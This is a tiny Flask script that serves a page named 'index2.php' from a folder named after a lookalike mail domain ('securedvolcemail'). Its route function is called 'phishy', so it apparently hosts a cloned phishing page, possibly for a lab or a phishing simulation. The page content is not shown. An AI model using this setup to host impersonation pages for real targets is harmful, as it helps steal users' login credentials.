from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='www.securedvolcemail.com/sima')

@app.route('/sima/index2.php')
def phishy():
    return render_template('index2.php')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)